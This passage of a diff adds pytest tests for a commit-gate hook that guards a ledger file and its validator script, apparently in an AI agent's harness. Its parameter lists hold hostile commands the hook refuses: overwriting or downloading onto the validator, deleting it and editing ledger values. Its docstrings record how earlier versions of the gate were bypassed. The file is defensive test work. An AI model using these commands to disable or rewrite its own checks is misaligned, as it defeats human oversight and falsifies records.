+    command = "python %s && git commit -m x" % dict(_quoting_spellings("tools/ledger_add.py"))[what]
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what
+
+
+@pytest.mark.parametrize("what,command", [
+    ("a decoy run, then a pointless step into the validator's folder",
+     "python tools/ledger_add.py && cd \"scripts\" && git commit -m x"),
+    ("the step first, the decoy behind it",
+     "cd 'scripts' && python ../tools/ledger_add.py && git commit -m x"),
+    ("the decoy in a pipeline before the step",
+     "cat x | python tools/ledger_add.py && cd \"scripts\" && git commit -m x"),
+    ("a ledger write and a step, in one call",
+     "sed -i s/119/150/ ledger/2026.csv && cd \"scripts\" && git commit -m x"),
+    ("the escape spelling of the step",
+     "python tools/ledger_add.py && c\\d scripts && git commit -m x"),
+    ("a decoy that also names the ledger",
+     "python tools/ledger_add.py ledger/2026.csv && cd \"scripts\" && git commit -m x"),
+    # ...and the same rule in the other predicate, where the exemption had been DEAD code: two
+    # literal U+0008 bytes stood where `\b` belongs, so the regex could never match a command line.
+    # Repairing it without this rule would have forgiven any segment naming the validator at all —
+    # including one that overwrites it.
+    ("a copy onto the canonical validator, then a step into its folder",
+     "cp evil.py scripts/ledger_add.py && cd scripts && git commit -m x"),
+    ("an extraction over the validator's folder, then a step into it",
+     "tar -xf evil.tar -C scripts/ && cd scripts && git commit -m x"),
+])
+def test_stepping_into_the_validators_directory_forgives_only_the_bare_name(tmp_path, what,
+                                                                            command):
+    """`cd scripts` exists here for ONE shape: in that directory the bare `ledger_add.py` IS the
+    canonical file, so reading it as a decoy refused the gate's own advertised remedy. It was
+    asked of the whole COMMAND and then ended the decoy loop outright, so any `cd scripts` anywhere
+    switched the rule off for every segment — and `_quoting_resolved` made that reachable from
+    spellings the raw text never contained (`cd "scripts"`, `c\\d scripts`), which is a second
+    reading REMOVING a refusal. A path with a directory in it names a different file from every
+    working directory there is, so it is never what the step forgives."""
+    ledger_repo(tmp_path)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what
+
+
+def _word_end_characters(wanted=True):
+    """The characters the RUNNING `_WORD_END` treats as ending a word (or, with `wanted=False`,
+    the filename characters it does not) — probed off the pattern, never listed here."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    probe = re.compile(gate._WORD_END)
+    candidates = string.printable
+    found = [char for char in candidates if bool(probe.match(char)) is wanted]
+    assert found, "the word-end probe found nothing — this test could not fail"
+    return found
+
+
+# THE WORD-END SET AS THIS TEST EXPECTS IT, written here INDEPENDENTLY of the gate. `_WORD_END` is
+# hand-written and cannot be derived from anything the repo already has, so what CLAUDE.md asks of
+# an unavoidable enumeration applies: a tripwire that measures both ends. A second statement of the
+# set is the only thing that can measure the first — deriving the expectation from the pattern
+# under test is what made the previous cut of this tripwire green while the verifier's mutation
+# dropped `<` and `>` from it (the derived parameter list lost the very entries it should have
+# defended, exactly as the `[cem]` parametrisation did one round earlier).
+_EXPECTED_WORD_ENDS = set(" \t\n\r\x0b\x0c" + "\"'`;|&()<>")
+
+
+def test_every_word_end_character_is_needed_and_no_other_ends_the_word():
+    """The tripwire the `_WORD_END` comment names, with BOTH ends, because a hand-written set rots
+    in two directions.
+
+    Drop an entry and a destination stops being seen: `-C scripts/` followed by that character is a
+    write into the validator's folder. Add a FILENAME character and the opposite breaks:
+    `scripts/x` is a file, not the bare directory, and reading it as one would refuse ordinary work
+    in that folder. The set is stated here rather than read off the gate, so the two can disagree;
+    the per-character half below is then asked of the composed pattern that actually runs."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    assert set(_word_end_characters()) == _EXPECTED_WORD_ENDS, (
+        "`_WORD_END` and this test disagree; only %r ends a word for the gate, only %r for this "
+        "test — decide which is right and change BOTH"
+        % (sorted(set(_word_end_characters()) - _EXPECTED_WORD_ENDS),
+           sorted(_EXPECTED_WORD_ENDS - set(_word_end_characters()))))
+    for char in sorted(_EXPECTED_WORD_ENDS):
+        assert gate._PROTECTED_DIR_RX.search("tar -xf e.tar -C scripts/" + char), (
+            "%r no longer ends the destination word" % char)
+    for other in _word_end_characters(wanted=False):
+        assert not gate._PROTECTED_DIR_RX.search("tar -xf e.tar -C scripts/" + other), (
+            "%r started ending the destination word" % other)
+
+
+@pytest.mark.parametrize("char", _word_end_characters(wanted=False))
+@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
+def test_a_name_that_continues_past_the_canonical_one_is_a_different_file(
+        tmp_path, canonical, tail, char):
+    """A SIBLING is not a suffix from a list, it is any name that starts with the canonical one and
+    keeps going — and the characters it can keep going with are exactly the ones that do not end a
+    shell word. So they are probed off `_WORD_END` instead of typed, and the anchor is asked about
+    every one of them.
+
+    The anchor was `\\b` (satisfied by the `.` of `.bak`), then `(?![\\w.-])`, which is a LIST of
+    continuation characters: every filename character outside it ended the path for this reader and
+    not for the shell, so `scripts/ledger_add.py+x`, `…py~`, `…py,v`, `…py@`, `…py%1`, `…py=x`,
+    `…py:evil` (an NTFS data stream) and `…py/../evil.py` were all vouched for as the guarded
+    program — measured exit 0 through the registered chain, with a filesystem witness showing the
+    sibling actually ran. The anchor is now the same `_WORD_END` the destination reader uses."""
+    ledger_repo(tmp_path)
+    command = "python %s%sx %s && git commit -m x" % (canonical, char, tail)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)
+
+
+@pytest.mark.parametrize("char", _word_end_characters())
+@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
+def test_a_quoted_word_end_character_does_not_end_the_word(tmp_path, canonical, tail, char):
+    """The other half of the sibling property, and the one the fix for the first half opened.
+
+    Every character that ends a shell WORD is a legal character IN A FILENAME, and quoting is what
+    tells the two apart. Resolving the quoting before any reader looks at the text throws that
+    difference away: `python "scripts/ledger_add.py evil.py" ledger/2026.csv && git commit` became
+    the text `python scripts/ledger_add.py evil.py ledger/…`, in which the canonical path is
+    followed by a space, so the anchor said "the word ends here" and vouched for a program nobody
+    guards. Measured exit 0 through the registered chain, with a shell arbiter showing ONE argv word
+    and a filesystem witness showing the sibling running and rewriting the ledger; `(`, `>`, `<`,
+    `'` and a doubled space each spell the same hole.
+
+    So the characters are probed off `_WORD_END` rather than listed, exactly as its unquoted
+    counter-test does, and the fix is `_as_one_word`: a value the shell BUILT keeps a quote mark
+    when it carries such a character. The counter-direction — the canonical path however it is
+    quoted keeps its exemption — is `test_quoting_inside_a_word_does_not_change_which_file_it_names`
+    and is what stops that from being answered by refusing everything quoted."""
+    ledger_repo(tmp_path)
+    quote = "'" if char != "'" else '"'
+    command = "python %s%s%s%s %s && git commit -m x" % (
+        quote, canonical, char, "evil" + quote, tail)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)
+
+
+@pytest.mark.parametrize("char", _word_end_characters(wanted=False))
+def test_only_the_validators_own_directory_forgives_the_bare_name(tmp_path, char):
+    """`cd scripts` forgives the bare name because IN THAT DIRECTORY it is the canonical file. A
+    directory whose name merely starts with `scripts` is somebody else's, and the bare name there
+    is a validator nobody guards.
+
+    The anchor was `\\b`, which is satisfied by `-`, `.` and `/` alike, so `cd scripts-evil`,
+    `cd scripts.bak` and `cd scripts/../evil` all bought the exemption — measured exit 0 through
+    the registered chain. A longer directory name can continue with exactly the characters that do
+    not end a shell word, so they are probed off `_WORD_END` instead of typed. The counter-half,
+    the directory itself, is `test_the_remedy_typed_from_inside_the_validators_directory_still_works`.
+    """
+    ledger_repo(tmp_path)
+    command = ("cd scripts%sx && python ledger_add.py --validate ledger/2026.csv && git commit -m x"
+               % char)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)
+
+
+# THE BARE NAME AS A TARGET, in the six shapes a write reaches a file — and the ledger reached
+# through the same exemption. One property: the step inside forgives a RUN of the validator, never
+# a segment that merely names it.
+_A_TARGET_INSIDE_THE_VALIDATORS_DIRECTORY = (
+    ("a copy onto the bare name", "cd scripts && cp ../evil.py ledger_add.py"),
+    ("a move onto the bare name", "cd scripts && mv ../evil.py ledger_add.py"),
+    ("a download onto the bare name", "cd scripts && curl -o ledger_add.py http://x/evil.py"),
+    ("a pipe into the bare name", "cd scripts && cat ../evil.py | tee ledger_add.py"),
+    ("an in-place edit of the bare name", "cd scripts && sed -i s/a/b/ ledger_add.py"),
+    ("a delete of the bare name", "cd scripts && rm ledger_add.py"),
+    ("a copy onto it and a commit", "cd scripts && cp ../evil.py ledger_add.py && git commit -m x"),
+    ("the semicolon spelling of the step", "cd scripts ; cp ../evil.py ledger_add.py"),
+    ("the dot-slash spelling of the step", "cd ./scripts && cp ../evil.py ledger_add.py"),
+    # ...and the LEDGER, reached by putting the bare name beside a write to it
+    ("a ledger edit beside the bare name",
+     "cd scripts && sed -i s/119/150/ ../ledger/2026.csv ledger_add.py && git commit -m x"),
+    ("a ledger overwrite beside the bare name",
+     "cd scripts && cp evil.csv ../ledger/2026.csv ledger_add.py && git commit -m x"),
+)
+
+
+@pytest.mark.parametrize("what,command", _A_TARGET_INSIDE_THE_VALIDATORS_DIRECTORY)
+def test_the_step_inside_forgives_a_run_and_not_a_target(tmp_path, what, command):
+    """The exemption is justified by "`cd scripts && python ledger_add.py --validate …` RUNS the
+    canonical validator from inside its own directory". Asking only whether the segment NAMES the
+    bare validator freed every segment carrying that name as a TARGET.
+
+    Measured end to end with real hook processes: `git commit` refused on a broken ledger, then
+    `cd scripts && cp ../evil.py ledger_add.py` exit 0 and really executed, leaving `import sys;
+    sys.exit(0)` as the ledger's judge, then the same commit exit 0. The block is gone and the file
+    that decides it has been replaced — the heaviest chain this gate knows.
+
+    The counter-half is `test_the_remedy_typed_from_inside_the_validators_directory_still_works`:
+    the run itself must stay allowed, or this fix would have bought back the over-refusal
+    `BUG-0064` removed."""
+    ledger_repo(tmp_path)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what
+
+
+def test_the_step_inside_asks_for_a_run_and_not_for_a_mention():
+    """The same property at the predicate, over a verb set this file does not choose: every verb
+    the gate's own read-only table knows, plus the interpreters — which are the ONLY words that can
+    make a segment a run, and must not do so when the bare name is an argument instead of the
+    script. `_only_the_bare_validator` knows nothing about `_READ_ONLY_VERBS`, so this is a
+    cross-check rather than the pattern under test asked about itself."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    assert gate._only_the_bare_validator("python ledger_add.py --validate ../ledger/2026.csv")
+    assert gate._only_the_bare_validator("python -B ./ledger_add.py --validate ../ledger/2026.csv")
+    for verb in sorted(gate._READ_ONLY_VERBS) + ["python", "python3.12", "py"]:
+        segment = "%s ../evil.py ledger_add.py" % verb
+        assert not gate._only_the_bare_validator(segment), segment
+
+
+# A DIRECTORY PART MAKES IT A DIFFERENT FILE, in the shapes a path can carry one. Built around one
+# directory word instead of listed as finished paths, so what is parametrised is the property and
+# not five spellings somebody thought of.
+_DIRECTORY_PARTS = ("tools/", "../tools/", "./tools/", "/tmp/evil/", "a/b/")
+
+
+@pytest.mark.parametrize("directory", _DIRECTORY_PARTS)
+def test_a_validator_with_a_directory_part_loses_the_step_inside(tmp_path, directory):
+    """`_only_the_bare_validator` has two halves, and this is the one no test measured.
+
+    The half that asks for a RUN is pinned by the test above. The half that asks that the stage
+    name the validator NO OTHER WAY was carried only by a docstring example that the caller
+    refutes: `python ledger_add.py && rm ledger_add.py` never reaches this predicate as one unit,
+    because `&&` is a segment separator. On a stage that no split can take apart, the half is what
+    decides — an argument handed to the canonical run is inside the vouched stage, so a decoy named
+    there would be vouched for with it. Measured in a clone outside the repo: with the
+    no-directory half removed, `cd scripts && python ledger_add.py --validate ../ledger/2026.csv
+    ../tools/ledger_add.py && git commit -m x` falls from rc 2 to rc 0 while the whole hook suite
+    stays green.
+
+    The counter-end is in the same case: the bare spelling of the same run is the gate's own
+    advertised remedy and must stay allowed, so this cannot be answered by refusing the run.
+    """
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    stage = "python ledger_add.py --validate ../ledger/2026.csv %sledger_add.py" % directory
+    assert not gate._only_the_bare_validator(stage), stage
+    ledger_repo(tmp_path)
+    command = "cd scripts && %s && git commit -m x" % stage
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, directory
+    remedy = "cd scripts && python ledger_add.py --validate ../ledger/2026.csv && git commit -m x"
+    assert run_ledger(tmp_path, shell(tmp_path, remedy)).returncode == 0, "the remedy itself"
+
+
+@pytest.mark.parametrize("char", _word_end_characters())
+def test_a_quoted_directory_name_does_not_forgive_the_bare_validator(tmp_path, char):
+    """The `cd` half of what `_as_one_word` buys, and the trap its docstring warns about.
+
+    Resolving quotation makes `cd "scripts;evil"` the word `scripts;evil`, in which `_CD_SCRIPTS_RX`
+    would find its `cd scripts` followed by something `_WORD_END` calls a boundary — and the step
+    into `scripts/` is what makes a bare `ledger_add.py` the guarded file rather than a validator
+    nobody watches. `_as_one_word` stops that by keeping a quote mark in FRONT of a word the shell
+    built, which the anchor `cd\\s+\\.?/?scripts` has no room for.
+
+    That is a property of the ANCHOR, not of `_WORD_END`, and this test is here because the
+    difference is invisible in prose: `_PROTECTED_DIR_RX` carries a `["']?` in exactly that
+    position and is right to, being a refusing reader. Adding one here — the obvious tidy-up —
+    hands the exemption to any directory whose name merely starts with `scripts`. Measured: with
+    `["']?` inserted after `cd\\s+`, these cases go to rc 0.
+
+    The characters are probed off `_WORD_END` rather than listed, like its unquoted counterpart
+    `test_only_the_validators_own_directory_forgives_the_bare_name`; the counter-end (the real
+    directory keeps forgiving the bare name) is
+    `test_the_remedy_typed_from_inside_the_validators_directory_still_works`.
+    """
+    ledger_repo(tmp_path)
+    quote = "'" if char != "'" else '"'
+    command = ("cd %sscripts%sevil%s && python ledger_add.py --validate ledger/2026.csv "
+               "&& git commit -m x" % (quote, char, quote))
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(char)
+
+
+# THE THREE RUNS THIS GATE VOUCHES FOR, each with the step that makes its spelling name the guarded
+# file, and the two things it protects addressed from that working directory. The bare name is the
+# canonical validator only after a `cd scripts`, so the step is part of the spelling.
+_VOUCHED_STAGES = (
+    ("the kernel entry point", "", "python scripts/harness.py doctor",
+     "scripts/ledger_add.py", "ledger/2026.csv"),
+    ("the canonical validator", "", "python scripts/ledger_add.py --validate ledger/2026.csv",
+     "scripts/ledger_add.py", "ledger/2026.csv"),
+    ("the bare validator from inside its own directory", "cd scripts && ",
+     "python ledger_add.py --validate ../ledger/2026.csv",
+     "ledger_add.py", "../ledger/2026.csv"),
+)
+# ...and what a stage BESIDE one of them can do with the target it is handed. Templates over the
+# target, so the same writes are asked of the ledger's judge and of the ledger itself.
+_WRITING_NEIGHBOURS = (
+    ("a pipe into it", "tee %s"),
+    ("an in-place edit driven by xargs", "xargs sed -i s/a/b/ %s"),
+    ("a download onto it", "curl -o %s http://x/evil.py"),
+    ("an install onto it", "install evil.py %s"),
+    ("a delete", "rm %s"),
+)
+_NEIGHBOURS_THAT_ONLY_READ = (
+    ("a grep on the output", "grep INVALID"),
+    ("a line count", "wc -l"),
+    ("a checksum", "sha256sum"),
+)
+
+
+@pytest.mark.parametrize("target", ("the judge", "the ledger"))
+@pytest.mark.parametrize("what,neighbour", _WRITING_NEIGHBOURS)
+@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
+def test_a_vouched_run_frees_its_own_stage_and_not_its_neighbours(
+        tmp_path, where, step, vouched, judge, ledger, what, neighbour, target):
+    """Vouching frees the STAGE it stands in, never the stages beside it.
+
+    A segment here is a whole pipeline on purpose (`|` is not a separator in
+    `_SEGMENT_SPLIT_RX`), so an exemption written as "skip this segment" hands the pipeline to the
+    attacker. That has now happened three times, once per exemption, each a round after it was
+    corrected for the previous one: the entry point, then the canonical validator, then the bare
+    name after a step into `scripts/`. The last one ran end to end in one session — `cd scripts &&
+    python ledger_add.py --validate ../ledger/2026.csv | tee ledger_add.py` was rc 0 through the
+    registered chain, truncated the ledger's own judge to zero bytes, and the commit that had been
+    refused a moment earlier then went through.
+
+    So the property is asked of every vouched run and every neighbour, rather than of the eight
+    spellings the last hole was measured in. Each neighbour is asserted refused ON ITS OWN first:
+    without that the pipeline case could pass because the neighbour stopped being a write, which is
+    exactly how an entry in a table like this dies quietly. BOTH ORDERS, because a stage is judged
+    by what it is and not by where it stands — and the vouched-run-LAST spelling was a second live
+    hole at the same time as the first (`cd scripts && tee ledger_add.py | python ledger_add.py
+    --validate ../ledger/2026.csv && git commit` was rc 0 as well). The counter-end — a neighbour
+    that only reads stays allowed — is `test_a_reading_neighbour_of_a_vouched_run_is_still_allowed`.
+    """
+    ledger_repo(tmp_path)
+    stage = neighbour % (judge if target == "the judge" else ledger)
+    alone = "%s%s && git commit -m x" % (step, stage)
+    assert run_ledger(tmp_path, shell(tmp_path, alone)).returncode == 2, "alone: %s" % alone
+    for pipeline in ("%s | %s" % (vouched, stage), "%s | %s" % (stage, vouched)):
+        beside = "%s%s && git commit -m x" % (step, pipeline)
+        assert run_ledger(tmp_path, shell(tmp_path, beside)).returncode == 2, "beside: %s" % beside
+
+
+@pytest.mark.parametrize("what,neighbour", _NEIGHBOURS_THAT_ONLY_READ)
+@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
+def test_a_reading_neighbour_of_a_vouched_run_is_still_allowed(
+        tmp_path, where, step, vouched, judge, ledger, what, neighbour):
+    """The counter-end of the property above, without which it could be satisfied by refusing every
+    pipeline: piping a vouched run into a reader is how its output is looked at, and the validator
+    run is the gate's own advertised way out of a block."""
+    ledger_repo(tmp_path)
+    command = "%s%s | %s && git commit -m x" % (step, vouched, neighbour)
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == 0, "%s / %s was refused:\n%s" % (where, what, result.stderr)
+
+
+# EVERY PATTERN THAT HANDS OUT A VOUCHING EXEMPTION, so the anchor property below is asked of all
+# of them rather than of the one a finding happened to be measured in. This is a list, so it
+# carries the tripwire an unavoidable list owes: `test_every_vouching_run_pattern_is_named_here`
+# reads back the patterns the exemption's own code consults, so an entry that has died and a fourth
+# exemption that arrives without one both fail it — whatever the fourth one is CALLED.
+_VOUCHING_RUN_PATTERNS = (
+    ("_ENTRY_POINT_RUN_RX", "python scripts/harness.py doctor"),
+    ("_LEDGER_ADD_RUN_RX", "python scripts/ledger_add.py --validate ledger/2026.csv"),
+    ("_BARE_VALIDATOR_RUN_RX", "python ledger_add.py --validate ../ledger/2026.csv"),
+)
+# ...and the patterns that same code consults WITHOUT vouching: `_only_the_bare_validator` reads
+# every validator mention on its stage in order to REFUSE one that carries a directory part. Named
+# here so the check below can be an equality instead of a subset — a subset is satisfied by any
+# pattern that arrives later.
+_REFUSING_PATTERNS_OF_THE_EXEMPTION = ("_ANY_VALIDATOR_PATH_RX",)
+
+
+def _patterns_within(value, depth=4):
+    """Every `re.Pattern` inside `value`, however many containers deep it sits.
+
+    A module-level name does not have to BE a pattern to hand one to the code that names it: a
+    tuple of them behind `any(...)` is the shape the house rule "definitions, not enumerations"
+    pushes an exemption towards, and the reader below saw nothing of it until this existed.
+    Bounded rather than fully recursive, because a cyclic or huge module constant must not turn a
+    test into a hang.
+    """
+    if isinstance(value, re.Pattern):
+        return [value]
+    if depth <= 0:
+        return []
+    members = ()
+    if isinstance(value, dict):
+        members = tuple(value.keys()) + tuple(value.values())
+    elif isinstance(value, (tuple, list, set, frozenset)):
+        members = tuple(value)
+    out = []
+    for member in members:
+        out.extend(_patterns_within(member, depth - 1))
+    return out
+
+
+def _patterns_consulted_by(gate, entry):
+    """Every module-level regex the function `entry` reaches by a name its SOURCE spells.
+
+    Off the PARSED source, because the naming convention is not the property: an exemption is one
+    the exemption CODE asks, under any name. Three ways of reaching one are followed, each because
+    a measured construction used it: the pattern named directly; a pattern inside a module-level
+    CONTAINER the code names (`_patterns_within`); and either through another module-level function
+    or through a module-level LAMBDA, transitively -- the third shipped exemption already lives in
+    a helper (`_only_the_bare_validator`) and a fourth may do the same.
+
+    WHAT IT DOES NOT READ is every pattern this chain of names does not END at, and that class is
+    bigger than it looks -- the previous version of this paragraph called it "a pattern whose NAME
+    the source does not contain" and was refuted by a construction that spells BOTH names:
+    a module-level tuple of PREDICATE FUNCTIONS (`_MORE_VOUCHERS = (_extra_vouch,)`, called through
+    `any(f(stage) for f in _MORE_VOUCHERS)`), where the container holds no pattern and its name is
+    no function body. `globals()["_EXTRA_VOUCH"]` is invisible here for the same reason. Rather than
+    widen the enumeration a third time, `_patterns_called_by` asks the question the other way round
+    and the test below takes the UNION of the two -- measured, both of those are RED there while
+    this reader stays green.
+    """
+    tree = ast.parse(pathlib.Path(gate.__file__).read_text(encoding="utf-8"))
+    bodies = {node.name: node for node in tree.body if isinstance(node, ast.FunctionDef)}
+    for node in tree.body:                      # a module-level lambda is a body under a name too
+        if isinstance(node, ast.Assign) and isinstance(node.value, ast.Lambda):
+            for target in node.targets:
+                if isinstance(target, ast.Name):
+                    bodies.setdefault(target.id, node.value)
+    seen, todo, found = set(), [entry], set()
+    while todo:
+        name = todo.pop()
+        if name in seen or name not in bodies:
+            continue
+        seen.add(name)
+        for node in ast.walk(bodies[name]):
+            if not isinstance(node, ast.Name):
+                continue
+            if _patterns_within(getattr(gate, node.id, None)):
+                found.add(node.id)
+            elif node.id in bodies:
+                todo.append(node.id)
+    return found
+
+
+class _RecordingPattern(object):
+    """A stand-in for a compiled regex that notes the moment it is ASKED anything.
+
+    Delegating rather than subclassing, because `re.Pattern` is a C type that cannot be subclassed
+    and whose methods cannot be replaced. Every attribute is handed on; a CALLABLE one is wrapped so
+    that `search`, `match`, `fullmatch`, `finditer`, `sub` and the rest all count as being asked --
+    which of them a caller uses is the caller's business and must not decide whether it is seen.
+    """
+
+    def __init__(self, pattern, note):
+        self.__dict__["_pattern"] = pattern
+        self.__dict__["_note"] = note
+
+    def __getattr__(self, name):
+        attribute = getattr(self.__dict__["_pattern"], name)
+        if not callable(attribute):
+            return attribute
+        note = self.__dict__["_note"]
+
+        def recorded(*args, **kwargs):
+            note()
+            return attribute(*args, **kwargs)
+        return recorded
+
+
+def _recorders_for(value, note, depth=4):
+    """`value` with every `re.Pattern` in it replaced by a `_RecordingPattern`, or None.
+
+    None means "nothing to instrument here", so a caller can leave the attribute untouched instead
+    of rebuilding it. Containers are rebuilt rather than mutated, and only to the same bounded depth
+    `_patterns_within` reads to -- the two must agree, or a pattern could be found by one and left
+    uninstrumented by the other.
+    """
+    if isinstance(value, re.Pattern):
+        return _RecordingPattern(value, note)
+    if depth <= 0:
+        return None
+    if isinstance(value, dict):
+        rebuilt = {key: (_recorders_for(item, note, depth - 1) or item)
+                   for key, item in value.items()}
+        return rebuilt if _patterns_within(value, depth) else None
+    if isinstance(value, (tuple, list, set, frozenset)):
+        rebuilt = type(value)((_recorders_for(item, note, depth - 1) or item) for item in value)
+        return rebuilt if _patterns_within(value, depth) else None
+    return None
+
+
+def _patterns_called_by(gate, entry, probes):
+    """Every module-level regex `entry` really ASKS while it runs over `probes`.
+
+    THE OTHER HALF OF `_patterns_consulted_by`, and the reason there are two: that one follows names
+    through the parsed source and therefore sees every path but only the names it can resolve; this
+    one resolves nothing and sees only the paths the probes take. Their blind spots do not overlap,
+    so the test below takes the UNION. Measured: a fourth exemption held in a module-level tuple of
+    predicate FUNCTIONS is invisible to the first and caught here, and so is one fetched through
+    `globals()[...]`.
+
+    WHAT NEITHER OF THEM SEES, and it is now a class rather than a list of spellings: an exemption
+    that consults no `re.Pattern` AT ALL, and a pattern that is asked only for an input outside
+    `probes`. The first is measured, not supposed -- an arm spelled
+    `stage.strip().startswith("deno ")` frees the stage and both readers stay green -- and it is the
+    price of asking the question about PATTERNS; catching it needs a different question again
+    (which stage does the exemption free), which the behaviour tests above ask for the verbs they
+    enumerate. The second is why `_VOUCH_PROBES` includes stages that match NOTHING, so an `or`
+    chain is walked to its end instead of short-circuiting at its first arm.
+    """
+    called = set()
+    restore = {}
+    for name in dir(gate):
+        recorders = _recorders_for(getattr(gate, name), lambda n=name: called.add(n))
+        if recorders is not None:
+            restore[name] = getattr(gate, name)
+            setattr(gate, name, recorders)
+    try:
+        function = getattr(gate, entry)
+        for arguments in probes:
+            try:
+                function(*arguments)
+            except Exception:                     # noqa: BLE001 — a probe that raises still counts
+                pass                              # for what it asked before it did
+    finally:
+        for name, value in restore.items():
+            setattr(gate, name, value)
+    return called
+
+
+# Stages fed to the exemption so that every arm of its decision is walked. The FIRST two match
+# nothing on purpose: an `or` chain short-circuits at its first hit, so a probe that vouches would
+# hide every pattern behind it. `inside_scripts` is asked both ways because the third exemption is
+# reached only under one of them.
+_VOUCH_PROBES = tuple(
+    (stage, inside_scripts)
+    for stage in ("cat notes.md",
+                  "tee scripts/ledger_add.py",
+                  "python scripts/harness.py doctor",
+                  "python scripts/ledger_add.py --validate ledger/2026.csv",
+                  "python ledger_add.py --validate ../ledger/2026.csv",
+                  "python scripts/ledger_add.py --help | cat")
+    for inside_scripts in (False, True))
+
+
+def test_every_vouching_run_pattern_is_named_here():
+    """Both ends of the list above: no entry may be dead, and no exemption may be missing from it.
+
+    Asked of the exemption's own code rather than of the `*_RUN_RX` spelling. The previous cut
+    compared the module's `*_RUN_RX` names, so a hand-written fourth pattern under any other name
+    left it green while freeing stages — measured with a fourth run inserted into
+    `_stages_beside_the_vouched_runs` as `_EXTRA_VOUCH`, which is exactly the shape the docstring
+    claimed to catch.
+
+    HOW FAR THAT REACHES IS THE TWO READERS' ANSWER AND NOT THIS DOCSTRING'S, which is the
+    correction this paragraph exists for. It promised "one it reads is on one of the two lists or
+    this fails" twice, and was refuted twice: first by a pattern under any other name, then --
+    after the name-following reader had been widened to containers and lambdas -- by the CROSSING
+    of the two, a module-level tuple of predicate FUNCTIONS, which spells both names and resolves to
+    no pattern. Widening an enumeration a third time is the move that produced both refutations, so
+    the second reader asks the opposite question instead (`_patterns_called_by`: which patterns does
+    the exemption really ASK while it runs) and this takes the UNION. What the union still does not
+    see is stated at `_patterns_called_by` and is a class, not a list of spellings.
+    """
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    expected = ({name for name, _ in _VOUCHING_RUN_PATTERNS}
+                | set(_REFUSING_PATTERNS_OF_THE_EXEMPTION))
+    entry = "_stages_beside_the_vouched_runs"
+    named = _patterns_consulted_by(gate, entry)
+    called = _patterns_called_by(gate, entry, _VOUCH_PROBES)
+    assert named | called == expected, "named %s, called %s" % (sorted(named), sorted(called))
+    # ...and the running half must really run: an instrumentation that recorded nothing would make
+    # the union collapse onto the reader it was added to cover for, silently.
+    assert called, "no pattern was asked at all — the probes or the instrumentation are broken"
+    for name, run in _VOUCHING_RUN_PATTERNS:
+        assert getattr(gate, name).search(run), "%s no longer matches its own run: %s" % (name, run)
+
+
+def _may_open_a_vouched_stage(gate, char, run):
+    """May `char` stand in front of `run` INSIDE ONE STAGE, once the gate has cut the line?
+
+    Two halves, and the second is the one prose kept skipping: a character the cut REMOVES on its
+    way to a stage never reaches this position from any caller, so whatever the pattern answers for
+    it is unobservable — and an expectation that pins that answer pins a fiction. That is how `\\r`
+    came to be fixed here as a legal opening at the very moment PowerShell was reading it as a
+    statement separator. So the cut is asked (`_normalise_pipeline`, `_SEGMENT_SPLIT_RX`, the stage
+    split) instead of being assumed.
+    """
+    stages = [stage
+              for segment in gate._SEGMENT_SPLIT_RX.split(gate._normalise_pipeline(char + run))
+              for stage in segment.split("|")]
+    return (char.isspace() or char == "(") and char + run in stages
+
+
+@pytest.mark.parametrize("char", sorted(string.printable))
+@pytest.mark.parametrize("name,run", _VOUCHING_RUN_PATTERNS)
+def test_only_a_group_opening_stands_in_front_of_a_vouched_run(name, run, char):
+    """A vouched run is the BEGINNING of the stage it vouches for, and this is that property asked
+    character by character instead of at the one spelling a finding arrived in.
+
+    Every reader of these patterns is handed ONE pipeline stage, and the prefix used to be the
+    class `[;&|(]`. Three of those four were already dead: `;` and `&` are cut by
+    `_SEGMENT_SPLIT_RX` and `|` by the stage split, so no stage can contain them. The fourth, `(`,
+    can stand ANYWHERE in a stage — including quoted argument prose, which is the very text the
+    exemption exists to let through. So a stage that WRITES could be read as the vouched stage
+    instead of standing beside one: `cd scripts && tee ledger_add.py '(python ledger_add.py
+    --validate ../ledger/2026.csv)' < /dev/null && git commit` was rc 0 through the registered
+    chain, left the ledger's own judge at zero bytes, and released the commit that had just been
+    refused — measured against `tee`, `rm`, `sed -i` and `curl -o`, at the judge and at the ledger,
+    on all three runs, in both shells.
+
+    The expectation is stated here as a property and not read off the pattern, so the two can
+    disagree: whitespace, because a stage keeps the space the split left in front of it, and `(`,
+    because at the START of a stage a paren is the subshell spelling of the same command and
+    `(python scripts/ledger_add.py --validate …)` is a run this gate does vouch for. Anything else
+    in that position is a character of somebody's argument.
+
+    A LINE BREAK is neither, and that half is measured against the gate's own cut rather than
+    argued (`_may_open_a_vouched_stage`): the cut removes it, so no caller can hand the pattern a
+    stage beginning with one. The previous cut of this test asserted plain `str.isspace()` and so
+    demanded that `\\r` be accepted here — while `_normalise_pipeline` was not reading `\\r` as a
+    line break at all and PowerShell was ending a statement at it. Sampled over `string.printable`
+    rather than over the characters that came up.
+    """
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    vouches = getattr(gate, name).search(char + run) is not None
+    may_open_a_stage = _may_open_a_vouched_stage(gate, char, run)
+    assert vouches is may_open_a_stage, (
+        "%s reads %r in front of its run as %s" % (name, char, "an opening" if vouches else "prose"))
+
+
+@pytest.mark.parametrize("name,run", _VOUCHING_RUN_PATTERNS)
+def test_stage_openings_stack_in_front_of_a_vouched_run(name, run):
